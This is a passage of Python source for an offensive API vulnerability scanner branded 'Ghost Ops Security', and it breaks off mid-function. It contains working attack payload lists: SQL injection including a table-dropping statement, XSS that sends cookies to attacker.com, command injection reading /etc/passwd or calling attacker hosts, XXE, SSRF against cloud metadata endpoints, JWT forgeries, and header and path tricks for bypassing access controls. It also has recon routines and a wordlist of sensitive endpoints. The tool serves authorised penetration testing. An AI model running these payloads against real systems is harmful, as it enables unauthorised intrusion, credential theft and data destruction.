#!/usr/bin/env python3
"""
API Vulnerability Scanner v2.0 - Ghost Ops Security
Advanced API security testing with JSON pattern analysis and data manipulation
"""

import requests
import json
import time
import re
import argparse
import urllib.parse
import copy
import os
import hmac
import hashlib
import base64
from typing import Dict, List, Any, Tuple, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict
from datetime import datetime
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Suppress SSL warnings for testing
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

@dataclass
class Finding:
    """Data class for vulnerability findings"""
    endpoint: str
    method: str
    vulnerability_type: str
    severity: str
    description: str
    payload: str
    response_code: int
    evidence: str
    remediation: str
    timestamp: str
    manipulation_details: str = ""

class Colors:
    """ANSI color codes for terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'
    ORANGE = '\033[38;5;208m'   # Ghost Ops Harley orange
    GREY = '\033[38;5;240m'     # dark cool grey


# Ghost Ops house banner -- figlet "small" font, same style as ghosted_ai.py
GHOST_BANNER = r"""
  ___  _  _   ___   ___  _____  ___  _  _   ___     _    ___  ___  ___
 / __|| || | / _ \ / __||_   _||_ _|| \| | / __|   /_\  | _ \|_ _|/ __|
| (_ || __ || (_) |\__ \  | |   | | | .` || (_ |  / _ \ |  _/ | | \__ \
 \___||_||_| \___/ |___/  |_|  |___||_|\_| \___| /_/ \_\|_|  |___||___/
"""

GHOST_TAGLINE = ("Ghost Ops Security  |  Kill Chain Replay(TM) -- API Track  |  "
                 "API Vulnerability Scanner v2.1 | Authorized Use Only")

class APIVulnScanner:
    def __init__(self, base_url: str, headers: Dict = None, proxy: Dict = None, threads: int = 10,
                 cookies: Dict = None, output_dir: str = './reports', skip_chains: bool = False):
        self.base_url = base_url.rstrip('/')
        self.headers = headers or {}
        self.proxy = proxy
        self.threads = threads
        self.cookies = cookies or {}
        self.output_dir = output_dir
        self.skip_chains = skip_chains
        self.findings: List[Finding] = []
        self.endpoints: List[Dict] = []
        self.api_schemas: Dict = {}  # Store discovered API schemas
        self.json_patterns: List[Dict] = []  # Store JSON response patterns
        self.harvested_ids: set = set()  # Object IDs seen in responses (IDOR chain fuel)
        self.tech_fingerprints: set = set()  # Stack hints from headers/errors
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        if self.cookies:
            self.session.cookies.update(self.cookies)

        # Load comprehensive payloads
        self.payloads = self._load_payloads()
        
    def _load_payloads(self) -> Dict:
        """Load comprehensive attack payloads"""
        return {
            'sqli': [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "admin' --",
                "admin' #",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "1' AND 1=1--",
                "1' AND 1=2--",
                "' OR 'x'='x",
                "1; DROP TABLE users--",
                "' OR 1=1#",
                "' WAITFOR DELAY '0:0:5'--",
                "1' AND SLEEP(5)--",
                "' AND '1'='1",
                "' AND extractvalue(1,concat(0x7e,version()))--"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<body onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
                "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
                "<IMG SRC=\"javascript:alert('XSS');\">",
                "<script>fetch('http://attacker.com?c='+document.cookie)</script>",
                "'-alert(1)-'",
                "\"><img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>"
            ],
            'command_injection': [
                "; ls -la",
                "| ls -la",
                "&& ls -la",
                "|| ls -la",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "&& whoami",
                "; ping -c 4 127.0.0.1",
                "`whoami`",
                "$(whoami)",
                "; sleep 5",
                "| sleep 5 #",
                "&& timeout 5",
                "; curl http://attacker.com",
                "| wget http://attacker.com"
            ],
            'path_traversal': [
                "../../../etc/passwd",
                r"..\..\..\windows\win.ini",
                "....//....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "..%252F..%252F..%252Fetc%252Fpasswd",
                "/etc/passwd",
                "../../../../../../etc/passwd%00",
                r"....\/....\/....\/etc/passwd",
                "....//....//....//windows/win.ini",
                "/var/www/../../etc/passwd"
            ],
            'xxe': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]><foo>&xxe;</foo>',
                '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo></foo>'
            ],
            'ssrf': [
                "http://127.0.0.1",
                "http://localhost",
                "http://169.254.169.254/latest/meta-data/",
                "http://[::1]",
                "http://127.1",
                "http://0.0.0.0",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://instance-data/latest/meta-data/",
                "http://127.0.0.1:22",
                "http://localhost:3306",
                "http://169.254.169.254/latest/user-data/"
            ],
            'idor': [
                "1", "2", "100", "999", "0", "-1", "admin", "test", "9999", "00001"
            ],
            'nosqli': [
                '{"$gt":""}',
                '{"$ne":null}',
                '{"$regex":".*"}',
                '{"username":{"$ne":null},"password":{"$ne":null}}',
                '{"$where":"sleep(5000)"}',
                '{"$or":[{},{"a":"a"}]}',
                '{"$gt": ""}',
                '{"$nin":[]}',
                '{"username":{"$regex":".*"}}'
            ],
            'jwt_attacks': [
                'none',
                'HS256',
                'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.',  # None algorithm
                'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.test'  # Modified claims
            ],
            'mass_assignment': [
                '{"isAdmin":true}',
                '{"role":"admin"}',
                '{"permission":"admin"}',
                '{"admin":1}',
                '{"is_admin":true}',
                '{"user_role":"administrator"}',
                '{"privileges":["admin","superuser"]}',
                '{"account_type":"premium"}',
                '{"verified":true}',
                '{"active":true}',
                '{"approved":true}',
                '{"status":"active"}',
                '{"membership":"premium"}'
            ],
            'graphql_attacks': [
                '{ __schema { types { name } } }',
                '{ __type(name: "Query") { fields { name } } }',
                'query { user(id: "1") { password email ssn } }',
                'mutation { deleteUser(id: "1") { id } }',
                'query { users { password } }',
                '{ __schema { queryType { fields { name } } } }'
            ],
            'api_abuse': [
                '999999',
                '-1',
                '0',
                '{"price":0.01}',
                '{"discount":100}',
                '{"quantity":999999}',
                '{"amount":-100}',
                '{"balance":999999999}'
            ],
            'rate_limit_bypass': [
                '127.0.0.1',
                '0.0.0.0',
                '10.0.0.1',
                'localhost'
            ],
            'ssti': [
                '{{7*7}}',
                '${7*7}',
                '<%= 7*7 %>',
                '#{7*7}',
                '*{7*7}',
                '{{7*\'7\'}}',
                '${{7*7}}',
                '@(7*7)'
            ],
            'open_redirect': [
                'https://evil.ghostops-test.com',
                '//evil.ghostops-test.com',
                '/\\evil.ghostops-test.com',
                'https:evil.ghostops-test.com',
                '%2F%2Fevil.ghostops-test.com'
            ],
            'crlf_injection': [
                '%0d%0aX-Ghost-Injected:%20true',
                '%0aX-Ghost-Injected:%20true',
                '%0d%0aSet-Cookie:%20ghost=injected',
                '\r\nX-Ghost-Injected: true'
            ],
            'weak_jwt_secrets': [
                'secret', 'password', 'changeme', 'key', 'private', 'jwt',
                'jwt_secret', 'secretkey', 'supersecret', '123456', 'admin',
                'test', 'dev', 'your-256-bit-secret', 'qwerty'
            ]
        }

    # ------------------------------------------------------------------
    # Static tables used by the recon / bypass / chain phases
    # ------------------------------------------------------------------

    # Header sets that commonly flip a 401/403 to a 200 behind reverse
    # proxies and IP-allowlist middleware.
    BYPASS_HEADER_SETS = [
        {'X-Forwarded-For': '127.0.0.1'},
        {'X-Real-IP': '127.0.0.1'},
        {'X-Custom-IP-Authorization': '127.0.0.1'},
        {'X-Originating-IP': '127.0.0.1'},
        {'X-Forwarded-Host': 'localhost'},
        {'X-Original-URL': None},   # filled with the target path at test time
        {'X-Rewrite-URL': None},    # filled with the target path at test time
    ]

    # Path mutations that dodge naive prefix/exact-match ACLs.
    PATH_BYPASS_MUTATIONS = [
        '{path}/.',
        '{path}/',
        '/{path}',      # double leading slash once joined
        '{path}%20',
        '{path}%09',
        '{path}..;/',
        '{path};.json',
        '{PATH_UPPER}',
    ]

    # Common OpenAPI/Swagger/API-doc locations for spec-driven enumeration.
    SPEC_PATHS = [
        '/openapi.json', '/openapi.yaml', '/swagger.json', '/swagger.yaml',
        '/swagger/v1/swagger.json', '/api/openapi.json', '/api/swagger.json',
        '/v2/api-docs', '/v3/api-docs', '/api-docs', '/api/api-docs',
        '/api/docs/swagger.json', '/.well-known/openapi.json',
        '/swagger-ui.html', '/swagger-ui/', '/redoc', '/api/schema/',
    ]

    # Response-body secret patterns -- scanned on every JSON response seen
    # during discovery, not just on dedicated probes.
    SECRET_PATTERNS = [
        (re.compile(r'AKIA[0-9A-Z]{16}'), 'AWS access key id'),
        (re.compile(r'(?<![A-Za-z0-9_-])eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*'), 'JWT token'),
        (re.compile(r'sk-[A-Za-z0-9]{20,}'), 'secret API key (sk- prefix)'),
        (re.compile(r'AIza[0-9A-Za-z_\-]{35}'), 'Google API key'),
        (re.compile(r'xox[bpars]-[0-9A-Za-z\-]{10,}'), 'Slack token'),
        (re.compile(r'ghp_[A-Za-z0-9]{36}'), 'GitHub personal access token'),
        (re.compile(r'-----BEGIN (?:RSA |EC |OPENSSH |)PRIVATE KEY-----'), 'PEM private key'),
        (re.compile(r'(?i)"(?:password|passwd|db_pass|secret_key)"\s*:\s*"[^"]{4,}"'), 'hardcoded credential field'),
    ]

    # Error/stack-trace fingerprints for the verbose-error probe and for
    # tech fingerprinting from malformed-input responses.
    STACK_TRACE_PATTERNS = [
        ('Traceback (most recent call last)', 'Python'),
        ('at java.', 'Java'), ('at org.springframework', 'Spring'),
        ('PHP Fatal error', 'PHP'), ('PHP Warning', 'PHP'),
        ('System.NullReferenceException', '.NET'), ('at System.', '.NET'),
        ('Microsoft.AspNetCore', 'ASP.NET Core'),
        ('node_modules', 'Node.js'), ('at Object.<anonymous>', 'Node.js'),
        ('actionpack', 'Ruby on Rails'), ('rack.version', 'Ruby/Rack'),
        ('goroutine ', 'Go'), ('panic: runtime error', 'Go'),
        ('ORA-', 'Oracle DB'), ('psycopg2', 'PostgreSQL/Python'),
    ]

    def print_banner(self):
        """Print the Ghost Ops banner + scan configuration"""
        use_color = sys.stdout.isatty() and os.environ.get('NO_COLOR') is None
        if use_color:
            print(f"{Colors.ORANGE}{GHOST_BANNER}{Colors.END}")
            print(f"{Colors.GREY}{GHOST_TAGLINE}{Colors.END}")
            print(f"{Colors.GREY}{'-' * 78}{Colors.END}")
        else:
            print(GHOST_BANNER)
            print(GHOST_TAGLINE)
            print('-' * 78)
        print(f"""{Colors.YELLOW}[*] Target: {self.base_url}
[*] Threads: {self.threads}
[*] Cookies: {'Enabled' if self.cookies else 'None'}
[*] Attack Chains: {'Disabled' if self.skip_chains else 'Enabled'}
[*] Report Directory: {self.output_dir}
[*] JSON Pattern Analysis: Enabled
[*] API Data Manipulation: Enabled
[*] Starting scan at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
{Colors.END}""")

    # ==================================================================
    # Phase 0: Passive recon & spec-driven enumeration
    # ==================================================================

    def recon_target(self) -> List[str]:
        """
        Pre-fuzzing recon: fingerprint the stack from headers, check CORS
        policy, harvest paths from robots.txt, and hunt for OpenAPI/Swagger
        specs. Returns extra endpoint paths to feed into discovery.
        """
        print(f"\n{Colors.BOLD}[+] Phase 0: Passive Recon & Spec Discovery{Colors.END}")
        extra_paths = []

        # --- Header fingerprinting -----------------------------------
        try:
            response = self.session.get(self.base_url, timeout=10, verify=False, proxies=self.proxy)
            interesting = ['Server', 'X-Powered-By', 'X-AspNet-Version', 'X-AspNetMvc-Version',
                           'X-Runtime', 'X-Generator', 'X-Backend-Server', 'Via', 'X-Kong-Proxy-Latency',
                           'X-Envoy-Upstream-Service-Time', 'X-Amzn-Trace-Id', 'X-Cache']
            leaked = {h: response.headers[h] for h in interesting if h in response.headers}
            for header, value in leaked.items():
                self.tech_fingerprints.add(f"{header}: {value}")
                print(f"{Colors.CYAN}[*] Fingerprint: {header}: {value}{Colors.END}")
            if any(h in leaked for h in ('Server', 'X-Powered-By', 'X-AspNet-Version', 'X-AspNetMvc-Version')):
                self._add_finding(
                    endpoint=self.base_url, method='GET',
                    vuln_type='Technology Disclosure via Headers', severity='LOW',
                    description='Response headers disclose server/framework versions',
                    payload='N/A', response_code=response.status_code,
                    evidence='; '.join(f'{k}: {v}' for k, v in leaked.items()),
                    remediation='Strip or genericize Server/X-Powered-By headers at the proxy layer.'
                )
        except Exception:
            pass

        # --- CORS misconfiguration ------------------------------------
        self.test_cors_misconfiguration()

        # --- robots.txt path harvest ----------------------------------
        try:
            response = self.session.get(f"{self.base_url}/robots.txt", timeout=10, verify=False, proxies=self.proxy)
            if response.status_code == 200 and 'html' not in response.headers.get('Content-Type', '').lower():
                harvested = []
                for line in response.text.splitlines():
                    match = re.match(r'(?i)(?:dis)?allow:\s*(/\S+)', line.strip())
                    if match and '*' not in match.group(1):
                        harvested.append(match.group(1).rstrip('$'))
                if harvested:
                    extra_paths.extend(harvested[:30])
                    print(f"{Colors.GREEN}[✓] robots.txt disclosed {len(harvested)} paths (importing up to 30){Colors.END}")
        except Exception:
            pass

        # --- OpenAPI / Swagger spec discovery -------------------------
        for spec_path in self.SPEC_PATHS:
            try:
                response = self.session.get(f"{self.base_url}{spec_path}", timeout=10, verify=False, proxies=self.proxy)
                if response.status_code != 200:
                    continue
                content_type = response.headers.get('Content-Type', '').lower()
                if spec_path in ('/swagger-ui.html', '/swagger-ui/', '/redoc', '/api/schema/'):
                    if 'html' in content_type and ('swagger' in response.text.lower() or 'redoc' in response.text.lower()):
                        print(f"{Colors.YELLOW}[!] API documentation UI exposed: {spec_path}{Colors.END}")
                        self._add_finding(
                            endpoint=spec_path, method='GET',
                            vuln_type='Exposed API Documentation UI', severity='LOW',
                            description=f'Interactive API docs reachable at {spec_path}',
                            payload='N/A', response_code=200,
                            evidence='Swagger/ReDoc UI served',
                            remediation='Restrict documentation UIs to internal networks in production.'
                        )
                    continue
                try:
                    spec = response.json()
                except ValueError:
                    continue
                if not isinstance(spec, dict) or not spec.get('paths'):
                    continue
                imported = self._import_openapi_paths(spec)
                self.api_schemas[spec_path] = {'title': spec.get('info', {}).get('title', ''),
                                               'version': spec.get('info', {}).get('version', ''),
                                               'path_count': len(spec['paths'])}
                extra_paths.extend(imported)
                print(f"{Colors.GREEN}[✓] API spec found at {spec_path}: "
                      f"{len(spec['paths'])} documented paths imported into scan{Colors.END}")
                self._add_finding(
                    endpoint=spec_path, method='GET',
                    vuln_type='Exposed API Specification', severity='MEDIUM',
                    description=f'Machine-readable API spec at {spec_path} maps the full attack surface',
                    payload='N/A', response_code=200,
                    evidence=f"{len(spec['paths'])} paths, title: {spec.get('info', {}).get('title', 'n/a')}",
                    remediation='Do not serve OpenAPI/Swagger specs publicly in production unless intended.'
                )
            except Exception:
                pass

        if not extra_paths:
            print(f"{Colors.YELLOW}[*] No spec/robots paths found -- proceeding with wordlist only{Colors.END}")
        return extra_paths

    def _import_openapi_paths(self, spec: Dict) -> List[str]:
        """Turn documented spec paths into concrete probe paths ({id} -> 1)."""
        imported = []
        base_path = ''
        # Swagger 2.0 basePath / OpenAPI 3 servers[0].url path component
        if isinstance(spec.get('basePath'), str):
            base_path = spec['basePath'].rstrip('/')
        elif spec.get('servers'):
            try:
                base_path = urllib.parse.urlsplit(spec['servers'][0].get('url', '')).path.rstrip('/')
            except Exception:
                base_path = ''
        for path in list(spec.get('paths', {}).keys())[:150]:
            concrete = re.sub(r'\{[^}]+\}', '1', path)
            imported.append(f"{base_path}{concrete}")
        return imported

    def scan_response_secrets(self, text: str, endpoint: str):
        """Scan any response body for credential material -- runs during discovery."""
        if not text:
            return
        for pattern, label in self.SECRET_PATTERNS:
            match = pattern.search(text)
            if match:
                self._add_finding(
                    endpoint=endpoint, method='GET',
                    vuln_type='Secret/Credential Exposure in Response', severity='CRITICAL',
                    description=f'{label} present in API response body',
                    payload='N/A', response_code=200,
                    evidence=match.group(0)[:60] + ('...' if len(match.group(0)) > 60 else ''),
                    remediation='Never return credential material in API responses. Rotate the exposed secret immediately.'
                )
                print(f"{Colors.RED}[!] {label} exposed in {endpoint}{Colors.END}")

    def _harvest_ids(self, json_data: Any):
        """Collect object IDs from responses to fuel the IDOR harvest chain."""
        for path, value in self._find_id_fields(json_data):
            if isinstance(value, (int, str)) and str(value).strip() and len(str(value)) < 40:
                self.harvested_ids.add(str(value))

    def enumerate_api_versions(self):
        """
        Version sweep: for every discovered versioned path (/v1/, /v2/...),
        probe sibling versions. Older, forgotten API versions frequently
        lack the auth/validation fixes applied to the current one.
        """
        print(f"\n{Colors.BOLD}[+] Phase 1b: API Version Enumeration{Colors.END}")
        version_re = re.compile(r'/v(\d+)(?=/|$)')
        versioned = [e for e in self.endpoints if version_re.search(e['endpoint'])]
        if not versioned:
            print(f"{Colors.YELLOW}[*] No versioned paths discovered -- skipping{Colors.END}")
            return

        tested = set()
        shadow_found = 0
        for endpoint_data in versioned[:15]:
            original = endpoint_data['endpoint']
            current_version = int(version_re.search(original).group(1))
            for candidate in range(0, 6):
                if candidate == current_version:
                    continue
                sibling = version_re.sub(f'/v{candidate}', original, count=1)
                if sibling in tested:
                    continue
                tested.add(sibling)
                try:
                    response = self.session.request(
                        endpoint_data['method'], f"{self.base_url}{sibling}",
                        timeout=10, verify=False, allow_redirects=False, proxies=self.proxy)
                    if response.status_code not in (404, 501):
                        shadow_found += 1
                        severity = 'HIGH' if candidate < current_version else 'MEDIUM'
                        print(f"{Colors.YELLOW}[!] Alternate API version live: {sibling} "
                              f"(HTTP {response.status_code}){Colors.END}")
                        self._add_finding(
                            endpoint=sibling, method=endpoint_data['method'],
                            vuln_type='Shadow/Legacy API Version Accessible', severity=severity,
                            description=f'Version sibling of {original} responds -- legacy versions often lack current auth fixes',
                            payload='N/A', response_code=response.status_code,
                            evidence=f'HTTP {response.status_code}, {len(response.content)} bytes',
                            remediation='Decommission or gate legacy API versions; apply auth fixes across all versions.'
                        )
                        self.endpoints.append({'endpoint': sibling, 'method': endpoint_data['method'],
                                               'status': response.status_code,
                                               'content_type': response.headers.get('Content-Type', ''),
                                               'length': len(response.content), 'has_json': False})
                except Exception:
                    pass
        if not shadow_found:
            print(f"{Colors.GREEN}[+] No alternate versions responded{Colors.END}")

    def analyze_json_response(self, response: requests.Response, endpoint: str) -> Dict:
        """Analyze JSON response for patterns and structure"""
        try:
            json_data = response.json()
            analysis = {
                'endpoint': endpoint,
                'structure': self._get_json_structure(json_data),
                'sensitive_keys': self._find_sensitive_keys(json_data),
                'numeric_fields': self._find_numeric_fields(json_data),
                'boolean_fields': self._find_boolean_fields(json_data),
                'id_fields': self._find_id_fields(json_data),
                'url_fields': self._find_url_fields(json_data),
                'nested_objects': self._find_nested_objects(json_data),
                'array_fields': self._find_array_fields(json_data)
            }
            self.json_patterns.append(analysis)
            return analysis
        except:
            return {}

    def _get_json_structure(self, data, prefix='') -> Dict:
        """Recursively analyze JSON structure"""
        structure = {}
        if isinstance(data, dict):
            for key, value in data.items():
                full_key = f"{prefix}.{key}" if prefix else key
                structure[full_key] = type(value).__name__
                if isinstance(value, (dict, list)):
                    structure.update(self._get_json_structure(value, full_key))
        elif isinstance(data, list) and data:
            structure[f"{prefix}[0]"] = type(data[0]).__name__
            if isinstance(data[0], (dict, list)):
                structure.update(self._get_json_structure(data[0], f"{prefix}[0]"))
        return structure

    def _find_sensitive_keys(self, data, path='') -> List[str]:
        """Find potentially sensitive keys in JSON"""
        sensitive = []
        sensitive_patterns = [
            'password', 'passwd', 'pwd', 'secret', 'token', 'api_key', 'apikey',
            'private', 'ssn', 'social', 'credit', 'card', 'cvv', 'pin',
            'auth', 'session', 'jwt', 'bearer', 'key', 'salt', 'hash',
            'email', 'phone', 'address', 'dob', 'birth'
        ]
        
        if isinstance(data, dict):
            for key, value in data.items():
                current_path = f"{path}.{key}" if path else key
                if any(pattern in key.lower() for pattern in sensitive_patterns):
                    sensitive.append(current_path)
                if isinstance(value, (dict, list)):
                    sensitive.extend(self._find_sensitive_keys(value, current_path))
        elif isinstance(data, list):
            for i, item in enumerate(data[:5]):  # Check first 5 items
                if isinstance(item, (dict, list)):
                    sensitive.extend(self._find_sensitive_keys(item, f"{path}[{i}]"))
        return sensitive

    def _find_numeric_fields(self, data, path='') -> List[Tuple[str, Any]]:
        """Find numeric fields for price manipulation testing"""
        numeric = []
        if isinstance(data, dict):
            for key, value in data.items():
                current_path = f"{path}.{key}" if path else key
                if isinstance(value, (int, float)):
                    numeric.append((current_path, value))
                elif isinstance(value, (dict, list)):
                    numeric.extend(self._find_numeric_fields(value, current_path))
        elif isinstance(data, list):
            for i, item in enumerate(data[:5]):
                if isinstance(item, (dict, list)):
                    numeric.extend(self._find_numeric_fields(item, f"{path}[{i}]"))
        return numeric

    def _find_boolean_fields(self, data, path='') -> List[Tuple[str, bool]]:
        """Find boolean fields for privilege escalation testing"""
        boolean = []
        if isinstance(data, dict):
            for key, value in data.items():
                current_path = f"{path}.{key}" if path else key
                if isinstance(value, bool):
                    boolean.append((current_path, value))
                elif isinstance(value, (dict, list)):
                    boolean.extend(self._find_boolean_fields(value, current_path))
        elif isinstance(data, list):
            for i, item in enumerate(data[:5]):
                if isinstance(item, (dict, list)):
                    boolean.extend(self._find_boolean_fields(item, f"{path}[{i}]"))
        return boolean

    def _find_id_fields(self, data, path='') -> List[Tuple[str, Any]]:
        """Find ID fields for IDOR testing"""
        ids = []
        id_patterns = ['id', 'user_id', 'account_id', 'order_id', 'product_id', 'uuid', 'guid', 'ref']
        
        if isinstance(data, dict):
            for key, value in data.items():
                current_path = f"{path}.{key}" if path else key
                if any(pattern in key.lower() for pattern in id_patterns):
                    ids.append((current_path, value))
                if isinstance(value, (dict, list)):
                    ids.extend(self._find_id_fields(value, current_path))
        elif isinstance(data, list):
            for i, item in enumerate(data[:5]):
                if isinstance(item, (dict, list)):
                    ids.extend(self._find_id_fields(item, f"{path}[{i}]"))
        return ids

    def _find_url_fields(self, data, path='') -> List[Tuple[str, str]]:
        """Find URL fields for SSRF testing"""
        urls = []
        if isinstance(data, dict):
            for key, value in data.items():
                current_path = f"{path}.{key}" if path else key
                if isinstance(value, str) and ('url' in key.lower() or 'link' in key.lower() or value.startswith(('http://', 'https://'))):
                    urls.append((current_path, value))
                if isinstance(value, (dict, list)):
                    urls.extend(self._find_url_fields(value, current_path))
        elif isinstance(data, list):
            for i, item in enumerate(data[:5]):
                if isinstance(item, (dict, list)):
                    urls.extend(self._find_url_fields(item, f"{path}[{i}]"))
        return urls

    def _find_array_fields(self, data, path='') -> List[str]:
        """Find array fields for injection testing"""
        arrays = []
        if isinstance(data, dict):
            for key, value in data.items():
                current_path = f"{path}.{key}" if path else key
                if isinstance(value, list):
                    arrays.append(current_path)
                elif isinstance(value, dict):
                    arrays.extend(self._find_array_fields(value, current_path))
        return arrays

    def _find_nested_objects(self, data, path='', depth=0) -> List[Dict]:
        """Find nested objects for deep testing"""
        nested = []
        if depth > 5:
            return nested
            
        if isinstance(data, dict):
            for key, value in data.items():
                current_path = f"{path}.{key}" if path else key
                if isinstance(value, dict):
                    nested.append({'path': current_path, 'keys': list(value.keys()), 'depth': depth})
                    nested.extend(self._find_nested_objects(value, current_path, depth + 1))
                elif isinstance(value, list):
                    nested.extend(self._find_nested_objects(value, current_path, depth + 1))
        elif isinstance(data, list) and data:
            for i, item in enumerate(data[:3]):
                if isinstance(item, (dict, list)):
                    nested.extend(self._find_nested_objects(item, f"{path}[{i}]", depth + 1))
        return nested

    def manipulate_json_data(self, original_data: Dict, analysis: Dict) -> List[Dict]:
        """Generate manipulated versions of JSON data for testing"""
        manipulated_versions = []
        
        # Test 1: Flip all boolean fields
        if analysis.get('boolean_fields'):
            for field_path, original_value in analysis['boolean_fields']:
                test_data = copy.deepcopy(original_data)
                self._set_nested_value(test_data, field_path, not original_value)
                manipulated_versions.append({
                    'type': 'boolean_flip',
                    'field': field_path,
                    'original': original_value,
                    'modified': not original_value,
                    'data': test_data
                })
        
        # Test 2: Manipulate numeric fields (price, quantity, etc.)
        if analysis.get('numeric_fields'):
            for field_path, original_value in analysis['numeric_fields'][:10]:  # Limit to prevent too many tests
                for test_value in [0, -1, 0.01, 999999, -999999]:
                    test_data = copy.deepcopy(original_data)
                    self._set_nested_value(test_data, field_path, test_value)
                    manipulated_versions.append({
                        'type': 'numeric_manipulation',
                        'field': field_path,
                        'original': original_value,
                        'modified': test_value,
                        'data': test_data
                    })
        
        # Test 3: IDOR testing - modify ID fields
        if analysis.get('id_fields'):
            for field_path, original_value in analysis['id_fields'][:5]:
                for test_id in ['1', '2', '999', '0', 'admin', 'test']:
                    test_data = copy.deepcopy(original_data)
                    self._set_nested_value(test_data, field_path, test_id)
                    manipulated_versions.append({
                        'type': 'idor_test',
                        'field': field_path,
                        'original': original_value,
                        'modified': test_id,
                        'data': test_data
                    })
        
        # Test 4: SSRF via URL fields
        if analysis.get('url_fields'):
            for field_path, original_url in analysis['url_fields']:
                for ssrf_payload in self.payloads['ssrf'][:5]:
                    test_data = copy.deepcopy(original_data)
                    self._set_nested_value(test_data, field_path, ssrf_payload)
                    manipulated_versions.append({
                        'type': 'ssrf_test',
                        'field': field_path,
                        'original': original_url,
                        'modified': ssrf_payload,
                        'data': test_data
                    })
        
        # Test 5: Mass assignment - add privilege fields
        for payload in self.payloads['mass_assignment'][:5]:
            test_data = copy.deepcopy(original_data)
            try:
                additional_fields = json.loads(payload)
                test_data.update(additional_fields)
                manipulated_versions.append({
                    'type': 'mass_assignment',
                    'field': 'root',
                    'original': 'N/A',
                    'modified': payload,
                    'data': test_data
                })
            except:
                pass
        
        return manipulated_versions

    def _set_nested_value(self, data: Dict, path: str, value: Any):
        """Set value in nested dictionary using dot notation path"""
        keys = path.split('.')
        current = data
        
        for key in keys[:-1]:
            # Handle array notation
            if '[' in key:
                key_name = key.split('[')[0]
                index = int(key.split('[')[1].split(']')[0])
                if key_name not in current:
                    current[key_name] = []
                current = current[key_name][index]
            else:
                if key not in current:
                    current[key] = {}
                current = current[key]
        
        # Set the final value
        final_key = keys[-1]
        if '[' in final_key:
            key_name = final_key.split('[')[0]
            index = int(final_key.split('[')[1].split(']')[0])
            current[key_name][index] = value
        else:
            current[final_key] = value

    def discover_endpoints(self, wordlist: List[str] = None, extra_paths: List[str] = None) -> List[Dict]:
        """Discover API endpoints through fuzzing (wordlist + recon-derived paths)"""
        print(f"\n{Colors.BOLD}[+] Phase 1: Attack Surface Mapping{Colors.END}")

        common_endpoints = wordlist or [
            '/api/v1/users', '/api/v2/users', '/api/users',
            '/api/v1/admin', '/api/admin',
            '/api/v1/login', '/api/login', '/api/auth/login',
            '/api/v1/register', '/api/register',
            '/api/v1/profile', '/api/profile', '/api/me',
            '/api/v1/upload', '/api/upload',
            '/api/v1/download', '/api/download',
            '/api/v1/search', '/api/search',
            '/api/v1/products', '/api/products',
            '/api/v1/orders', '/api/orders',
            '/api/v1/config', '/api/config',
            '/api/v1/settings', '/api/settings',
            '/api/v1/logs', '/api/logs',
            '/api/v1/backup', '/api/backup',
            '/api/v1/export', '/api/export',
            '/api/v1/import', '/api/import',
            '/api/v1/docs', '/api/docs', '/api/swagger', '/api/swagger.json',
            '/api/v1/health', '/api/health',
            '/api/v1/status', '/api/status',
            '/graphql', '/api/graphql',
            '/.git/config', '/.env', '/api/.env',
            '/api/v1/payments', '/api/payments',
            '/api/v1/cart', '/api/cart',
            '/api/v1/checkout', '/api/checkout',
            # Auth/token surface
            '/api/v1/token', '/api/token', '/oauth/token', '/oauth/authorize',
            '/api/auth/refresh', '/api/v1/auth/refresh', '/api/auth/reset',
            '/api/v1/password/reset', '/api/forgot-password',
            '/api/v1/apikeys', '/api/keys', '/api/v1/api-keys',
            '/.well-known/oauth-authorization-server', '/.well-known/openid-configuration',
            # Multi-tenant / RBAC surface
            '/api/v1/roles', '/api/roles', '/api/v1/permissions', '/api/permissions',
            '/api/v1/tenants', '/api/tenants', '/api/v1/organizations', '/api/organizations',
            '/api/v1/teams', '/api/v1/groups', '/api/v1/invites', '/api/v1/members',
            # Business-object surface
            '/api/v1/invoices', '/api/invoices', '/api/v1/transactions', '/api/transactions',
            '/api/v1/notifications', '/api/notifications', '/api/v1/webhooks', '/api/webhooks',
            '/api/v1/files', '/api/files', '/api/v1/documents', '/api/documents',
            '/api/v1/reports', '/api/v1/audit', '/api/v1/billing', '/api/billing',
            # Framework/infra endpoints frequently left exposed
            '/actuator', '/actuator/env', '/actuator/health', '/actuator/mappings',
            '/actuator/heapdump', '/actuator/httptrace',
            '/debug', '/api/debug', '/console', '/api/console',
            '/metrics', '/api/metrics', '/trace', '/api/trace',
            '/server-status', '/api/internal', '/internal', '/private', '/api/private',
        ]

        if extra_paths:
